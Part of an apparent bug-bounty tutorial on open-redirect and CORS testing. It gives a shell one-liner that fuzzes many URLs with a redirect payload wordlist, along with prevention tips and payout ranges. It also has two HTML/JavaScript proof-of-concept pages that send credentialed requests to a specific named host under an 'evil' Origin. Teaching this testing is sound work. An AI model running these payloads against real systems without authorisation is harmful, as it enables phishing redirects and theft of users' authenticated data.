![None](https://miro.medium.com/v2/resize:fit:700/1*2rdI8gPFjWf-q2ZgrJI1SQ.jpeg)

For testing more advanced bypass payloads rather than simple ones use this command to try all bypass payloads from my custom wordlist:

```bash
cat urls.txt| gf redirect | uro | while read url; do cat /home/coffinxp/loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
```

![None](https://miro.medium.com/v2/resize:fit:700/1*sEFU9EMyyKWhLT8wOLDcnQ.jpeg)

### **Risks and Impacts**

- **Phishing Attacks**: Users are tricked into entering credentials on fake websites.
- **Malware Distribution**: Redirecting to sites that automatically download malware.
- **Session Hijacking**: Stealing session cookies through crafted URLs.

### How to Prevent

Here's how you can secure your website from open redirects:

- **Whitelist URLs**: Restrict redirection to trusted domains only.
- **Use Relative Paths:** Ditch full URLs for safer relative paths.
- **Validate Inputs**: Block any unknown or suspicious redirect values.
- **Show Warnings**: Notify users before redirecting them to external websites.

### üíµ Bug Bounty Payouts

- **Small Websites**: $50 ‚Äî $200
- **Mid-Sized Companies**: $200 ‚Äî $500
- **Big Corporations:** $500 ‚Äî $1000
- **Open Redirect to ATO** $1000 ‚Äî $5000


---
## CORS:

[**CORS**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) **:** If you‚Äôre not familiar with this bug, watch these videos:  

Documentation:

[> https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS

[Understanding CORS](https://www.youtube.com/watch?v=BTrmUjNbwUY)

https://youtu.be/fMgjmhxN9uI  --- CORS tutor


### Example 1: Testing with Fetch and Different Methods

**HTML + JavaScript:**

```HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS PoC</title>
</head>
<body>
    <h1>CORS Proof of Concept</h1>
    <button id="getButton">Test GET Request</button>
    <button id="postButton">Test POST Request</button>
    <p id="result"></p>

    <script>
        document.getElementById('getButton').addEventListener('click', function() {
            fetch('https://registrofamiglie.axioscloud.it', {
                method: 'GET',
                credentials: 'include',
                headers: {
                    'Origin': 'https://evil.axioscloud.it'
                }
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('result').textContent = data;
            })
            .catch(error => {
                document.getElementById('result').textContent = 'Error: ' + error;
            });
        });

        document.getElementById('postButton').addEventListener('click', function() {
            fetch('https://registrofamiglie.axioscloud.it', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Origin': 'https://evil.axioscloud.it',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ key: 'value' })
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('result').textContent = data;
            })
            .catch(error => {
                document.getElementById('result').textContent = 'Error: ' + error;
            });
        });
    </script>
</body>
</html>

```

### Example 2: Testing with XMLHttpRequest

**HTML + JavaScript:**

```HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS PoC</title>
</head>
<body>
    <h1>CORS Proof of Concept</h1>
    <button id="xhrButton">Test XMLHttpRequest</button>
    <p id="result"></p>

    <script>
        document.getElementById('xhrButton').addEventListener('click', function() {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://registrofamiglie.axioscloud.it', true);
            xhr.withCredentials = true;
            xhr.setRequestHeader('Origin', 'https://evil.axioscloud.it');

            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status === 200) {
                        document.getElementById('result').textContent = xhr.responseText;
                    } else {
                        document.getElementById('result').textContent = 'Error: ' + xhr.status;
                    }
                }
            };

            xhr.send();
        });
    </script>
</body>
</html>

```

----